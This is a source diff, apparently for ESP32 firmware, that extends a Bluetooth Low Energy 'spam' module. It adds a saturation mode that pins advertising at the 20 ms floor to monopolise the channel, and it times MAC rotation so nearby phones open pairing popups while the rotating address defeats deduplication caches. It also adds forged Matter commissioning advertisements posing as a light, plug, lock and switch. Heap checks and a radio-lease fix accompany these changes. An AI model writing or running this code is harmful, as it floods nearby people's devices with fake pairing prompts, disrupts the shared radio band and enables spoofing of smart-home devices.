@@ -32,8 +32,12 @@ static bt_spam_gap_sync_t gap_sync = {
     .completed = 0,
     .last_event = ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT,
     .last_status = ESP_BT_STATUS_SUCCESS};
-static bt_spam_mode_t current_mode = BT_SPAM_MODE_ALL;
+static bt_spam_mode_t current_mode = BT_SPAM_MODE_SATURATE;
 static bool gap_callback_registered = false;
+/* True while this module owns a radio_lease BLE claim. The lease is released
+   exactly once, either from bt_spam_app_deinit() or from the error path of
+   bt_spam_app_main(). */
+static bool bt_spam_lease_held = false;
 
 /* Chained GAP callback for other modules (e.g., bt_gattc) */
 static esp_gap_ble_cb_t chained_gap_cb = NULL;
@@ -51,6 +55,48 @@ static size_t min_free_heap_during_spam = 0;
    answer the connectable advertisement, short enough to outrun the per-address
    deduplication caches that the rotating address exists to defeat. */
 #define SPAM_MAC_ROTATION_CYCLES 8
+
+/* Saturation-mode timing. It keeps the 20/20 ms connectable interval (the
+   20 ms floor) so the advertising stream stays dense, but MAC identity and
+   dwell need popup-friendly windows: a peer needs a stable address long
+   enough to see the same advertisement repeatedly and open a popup, so the
+   MAC rotates only after several model cycles (not every second 50 ms
+   dwell, which defeated per-address popup maturation). */
+#define SPAM_MAC_ROTATION_CYCLES_SATURATE 20
+#define SPAM_DWELL_SLICES                 5
+#define SPAM_DWELL_SLICES_SATURATE        2
+#define SPAM_ADV_INTERVAL_SATURATE        0x20
+
+/* Bluedroid plus the controller need heap for the first advertising enable.
+   The combined Zigbee/Thread build leaves about 20 KB after Bluedroid comes
+   up; that is enough to advertise, but a few KB less is not. Refuse to start
+   below 18 KB and stop the loop if it falls below 8 KB, which is the range
+   where the controller returned "btm_ble_write_adv_enable_complete failed"
+   and the heap monitor reported EMERGENCY. */
+#define BT_SPAM_MIN_START_HEAP_BYTES  (18 * 1024)
+#define BT_SPAM_MIN_START_BLOCK_BYTES (10 * 1024)
+#define BT_SPAM_MIN_RUN_HEAP_BYTES    (8 * 1024)
+#define BT_SPAM_MIN_RUN_BLOCK_BYTES   (4 * 1024)
+
+static bool bt_spam_heap_is_safe(size_t min_free, size_t min_largest) {
+  size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
+  size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
+  if (free_heap >= min_free && largest >= min_largest) {
+    return true;
+  }
+  ESP_LOGE(TAG,
+           "Not enough heap for BLE advertising: free=%zu KB (need %zu KB), "
+           "largest=%zu KB (need %zu KB)",
+           free_heap / 1024, min_free / 1024, largest / 1024,
+           min_largest / 1024);
+  return false;
+}
+
+static void bt_spam_report_low_heap(void) {
+  if (display_records_cb != NULL) {
+    display_records_cb("Low Heap");
+  }
+}
 
 /*
  * ADV_TYPE_IND (connectable undirected advertising) allows adv_int down to 20ms
@@ -72,6 +118,7 @@ typedef enum {
   SPAM_TYPE_GOOGLE_FAST_PAIR,
   SPAM_TYPE_MICROSOFT_SWIFT,
   SPAM_TYPE_SAMSUNG_SETUP,
+  SPAM_TYPE_MATTER_SETUP,
 } spam_packet_type_t;
 
 typedef struct {
@@ -476,11 +523,48 @@ static const spam_model_t spam_models[] = {
     SPAM_SAMSUNG_BUDS(0x01, 0x17, 0x16, "Sleek Black Buds2"),
 
     /* =========================================================================
-     * 6. GENERIC ADVERTISING (Stealth mode) - No pairing popups
-     * These are standard BLE advertisements that don't trigger any
-     * platform-specific pairing modals. Useful for testing/measurement.
+     * 6. MATTER COMMISSIONING ONBOARDING (CSA Matter Specification)
+     * 16-bit Service UUID: 0xFFF6
+     * Advertised by uncommissioned Matter accessories (Bulb, Plug, Lock,
+     * Switch)
      * =========================================================================
      */
+    {
+        .name = "Matter Light",
+        .type = SPAM_TYPE_MATTER_SETUP,
+        .len = 31,
+        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0xf6, 0xff, 0x0b,
+                 0x16, 0xf6, 0xff, 0x00, 0x00, 0x0f, 0xf1, 0xff,
+                 0x01, 0x80, 0x00, 0x0b, 0x09, 'M',  'a',  't',
+                 't',  'e',  'r',  '-',  'L',  'u',  'x'},
+    },
+    {
+        .name = "Matter Plug",
+        .type = SPAM_TYPE_MATTER_SETUP,
+        .len = 31,
+        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0xf6, 0xff, 0x0b,
+                 0x16, 0xf6, 0xff, 0x00, 0x10, 0x0f, 0xf1, 0xff,
+                 0x02, 0x80, 0x00, 0x0b, 0x09, 'M',  'a',  't',
+                 't',  'e',  'r',  '-',  'S',  'o',  'c'},
+    },
+    {
+        .name = "Matter Lock",
+        .type = SPAM_TYPE_MATTER_SETUP,
+        .len = 31,
+        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0xf6, 0xff, 0x0b,
+                 0x16, 0xf6, 0xff, 0x00, 0x20, 0x0f, 0xf1, 0xff,
+                 0x03, 0x80, 0x00, 0x0b, 0x09, 'M',  'a',  't',
+                 't',  'e',  'r',  '-',  'K',  'e',  'y'},
+    },
+    {
+        .name = "Matter Switch",
+        .type = SPAM_TYPE_MATTER_SETUP,
+        .len = 31,
+        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0xf6, 0xff, 0x0b,
+                 0x16, 0xf6, 0xff, 0x00, 0x30, 0x0f, 0xf1, 0xff,
+                 0x04, 0x80, 0x00, 0x0b, 0x09, 'M',  'a',  't',
+                 't',  'e',  'r',  '-',  'T',  'o',  'g'},
+    },
 };
 
 #define TOTAL_SPAM_MODELS (sizeof(spam_models) / sizeof(spam_models[0]))
@@ -499,7 +583,9 @@ static bool model_matches_mode(const spam_model_t* model, bt_spam_mode_t mode) {
       return (model->type == SPAM_TYPE_MICROSOFT_SWIFT);
     case BT_SPAM_MODE_SAMSUNG:
       return (model->type == SPAM_TYPE_SAMSUNG_SETUP);
-    case BT_SPAM_MODE_ALL:
+    case BT_SPAM_MODE_MATTER:
+      return (model->type == SPAM_TYPE_MATTER_SETUP);
+    case BT_SPAM_MODE_SATURATE:
     default:
       return true;
   }
@@ -765,6 +851,12 @@ static void start_adv(void* pvParameters) {
   uint8_t payload_buffer[31];
   min_free_heap_during_spam = heap_caps_get_free_size(MALLOC_CAP_8BIT);
 
+  if (!bt_spam_heap_is_safe(BT_SPAM_MIN_RUN_HEAP_BYTES,
+                            BT_SPAM_MIN_RUN_BLOCK_BYTES)) {
+    bt_spam_report_low_heap();
+    running_task = false;
+  }
+
   /* Stop any existing advertising before setting random address */
   drain_sem();
   uint32_t init_stop_mark = bt_spam_gap_sync_mark(&gap_sync);
@@ -787,6 +879,13 @@ static void start_adv(void* pvParameters) {
            active_indices_count, (int) (min_free_heap_during_spam / 1024));
 
   while (running_task) {
+    if (!bt_spam_heap_is_safe(BT_SPAM_MIN_RUN_HEAP_BYTES,
+                              BT_SPAM_MIN_RUN_BLOCK_BYTES)) {
+      bt_spam_report_low_heap();
+      running_task = false;
+      break;
+    }
+
     if (active_indices_count == 0) {
       vTaskDelay(pdMS_TO_TICKS(50));
       continue;
@@ -828,7 +927,9 @@ static void start_adv(void* pvParameters) {
      *    neither a stable identity nor a usable connection window, so no popup
      *    ever appeared. Payload changes are pushed on the fly instead, which
      *    keeps the radio advertising continuously. */
-    bool rotate_mac = (cycle_count % SPAM_MAC_ROTATION_CYCLES) == 0;
+    bool rotate_mac = (cycle_count % (current_mode == BT_SPAM_MODE_SATURATE
+                                          ? SPAM_MAC_ROTATION_CYCLES_SATURATE
+                                          : SPAM_MAC_ROTATION_CYCLES)) == 0;
 
     if (rotate_mac || !is_advertising_active) {
       drain_sem();
@@ -900,9 +1001,18 @@ static void start_adv(void* pvParameters) {
       }
     }
 
-    /* 6. Dwell for ~250ms in 50ms slices for fast exit response */
-    for (int i = 0; i < 5 && running_task; i++) {
-      vTaskDelay(pdMS_TO_TICKS(50));
+    /* 6. Dwell for ~250ms in 50ms slices for fast exit response. The
+     *    saturation mode cuts the dwell to two slices (100 ms): it owns the
+     *    channel, so a shorter cycle maximises advertising occupancy in the
+     *    air while keeping a stable identity long enough for popups. */
+    if (current_mode == BT_SPAM_MODE_SATURATE) {
+      for (int i = 0; i < SPAM_DWELL_SLICES_SATURATE && running_task; i++) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+      }
+    } else {
+      for (int i = 0; i < SPAM_DWELL_SLICES && running_task; i++) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+      }
     }
 
     /* 7. Advance to next model within current active mode */
@@ -946,6 +1056,12 @@ bool bt_spam_is_running(void) {
 void bt_spam_app_main(bt_spam_mode_t mode) {
   ESP_LOGI(TAG, "Starting BT Spam mode %d...", mode);
 
+  if (!bt_spam_heap_is_safe(BT_SPAM_MIN_START_HEAP_BYTES,
+                            BT_SPAM_MIN_START_BLOCK_BYTES)) {
+    bt_spam_report_low_heap();
+    return;
+  }
+
   esp_err_t ret = ESP_OK;
 
   /* Brings up the controller and Bluedroid, and holds a BLE claim for the whole
@@ -956,14 +1072,27 @@ void bt_spam_app_main(bt_spam_mode_t mode) {
   ret = radio_lease_ble_acquire();
   if (ret != ESP_OK) {
     ESP_LOGE(TAG, "could not acquire the BLE stack: %s", esp_err_to_name(ret));
+    if (display_records_cb != NULL) {
+      display_records_cb("BLE Acq Fail");
+    }
     return;
   }
+  bt_spam_lease_held = true;
 
   /* Spam needs the radio completely idle before it can work at all: the gate
    * is taken *before* stopping the scan so no scanner's restart loop re-arms
    * a scan behind our back (the restart loops of the bt_gattc consumers check
    * radio_lease_ble_scan_allowed() before re-arming). */
   radio_lease_ble_block_scan();
+
+  /* Bluedroid has already allocated its host buffers here. Check again before
+     creating the advertising task: the pre-acquire check alone cannot see
+     that cost. */
+  if (!bt_spam_heap_is_safe(BT_SPAM_MIN_START_HEAP_BYTES,
+                            BT_SPAM_MIN_START_BLOCK_BYTES)) {
+    bt_spam_report_low_heap();
+    goto error;
+  }
 
   /* The random address can only be programmed while neither advertising nor
       scanning, and advertising can only start once a random address exists, so
@@ -1013,6 +1142,17 @@ void bt_spam_app_main(bt_spam_mode_t mode) {
   rebuild_active_indices(current_mode);
   adv_index = 0;
 
+  /* Saturation owns the channel, so it pins the advertising interval to the
+   * connectable 20 ms floor (and restores the permissive default for every
+   * other mode, in case the profile setters changed it mid-session). */
+  if (current_mode == BT_SPAM_MODE_SATURATE) {
+    ble_adv_params.adv_int_min = SPAM_ADV_INTERVAL_SATURATE;
+    ble_adv_params.adv_int_max = SPAM_ADV_INTERVAL_SATURATE;
+  } else {
+    ble_adv_params.adv_int_min = 0x20;
+    ble_adv_params.adv_int_max = 0x30;
+  }
+
   /* Stop any advertising in progress before starting task */
   drain_sem();
   uint32_t stop_mark = bt_spam_gap_sync_mark(&gap_sync);
@@ -1024,6 +1164,15 @@ void bt_spam_app_main(bt_spam_mode_t mode) {
   drain_sem();
   bt_spam_gap_sync_reset(&gap_sync);
   is_advertising_active = false;
+
+  /* The 4 KB advertising task stack comes out of this heap next. Do not start
+     it if that would leave the controller without room to enable advertising.
+   */
+  if (!bt_spam_heap_is_safe(BT_SPAM_MIN_START_HEAP_BYTES,
+                            BT_SPAM_MIN_START_BLOCK_BYTES)) {
+    bt_spam_report_low_heap();
+    goto error;
+  }
 
   running_task = true;
   adv_task_running = true;
@@ -1046,7 +1195,10 @@ error:
     gap_callback_registered = false;
   }
   radio_lease_ble_unblock_scan();
-  radio_lease_ble_release();
+  if (bt_spam_lease_held) {
+    radio_lease_ble_release();
+    bt_spam_lease_held = false;
+  }
 }
 
 void bt_spam_app_stop(void) {
@@ -1105,8 +1257,12 @@ void bt_spam_app_stop(void) {
 void bt_spam_app_deinit(void) {
   bt_spam_app_stop();
   /* Gives the BLE claim back; the stack is only torn down when this was the
-      last claim, which radio_lease tracks centrally. */
-  radio_lease_ble_release();
+      last claim, which radio_lease tracks centrally. The error path of
+      bt_spam_app_main() may already have released it. */
+  if (bt_spam_lease_held) {
+    radio_lease_ble_release();
+    bt_spam_lease_held = false;
+  }
   /* Only now may the scanners take the radio again. */
   radio_lease_ble_unblock_scan();
 
